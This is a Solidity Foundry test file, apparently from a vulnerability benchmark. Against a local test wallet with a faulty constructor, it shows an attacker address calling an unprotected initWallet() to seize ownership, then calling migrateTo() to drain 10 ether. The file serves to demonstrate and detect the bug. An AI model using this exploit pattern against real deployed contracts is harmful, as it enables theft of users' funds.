// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_03_wrong_constructor.sol";

contract WalletTest is Test {
    Wallet public wallet;
    address owner = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public {
        // Deploy the Wallet contract
        wallet = new Wallet();
        // Fund the contract with 10 ether
        vm.deal(address(wallet), 10 ether);
        // Attacker starts with 0 ether
        vm.deal(attacker, 0);
    }

    function testNonCreatorCanMigrateFunds() public {
        console.log("--- BEFORE-Trigger Balances ---");
        // Record initial balances
        uint256 contractBalanceBefore = address(wallet).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Initial contract balance: %s", contractBalanceBefore);
        console.log("Initial attacker balance: %s", attackerBalanceBefore);
        assertEq(contractBalanceBefore, 10 ether, "Contract should have 10 ether initially");
        assertEq(attackerBalanceBefore, 0, "Attacker should have 0 ether initially");

        console.log("--- Trigger Attack Actions ---");
        // Attacker calls unauthorized initWallet()
        vm.prank(attacker);
        console.log("Attacker calling initWallet()...");
        wallet.initWallet();

        // Attacker migrates all funds to themselves
        vm.prank(attacker);
        console.log("Attacker calling migrateTo()...");
        wallet.migrateTo(attacker);

        console.log("--- AFTER-Trigger Balances ---");
        uint256 contractBalanceAfter = address(wallet).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Final contract balance: %s", contractBalanceAfter);
        console.log("Final attacker balance: %s", attackerBalanceAfter);

        // Final vulnerability verdict
        if (contractBalanceAfter == 0 && attackerBalanceAfter == 10 ether) {
            console.log("Vulnerability Exists: Non-creator successfully initialized wallet and drained funds");
        } else {
            console.log("Vulnerability not Exist: Attack failed to drain funds");
        }
    }
}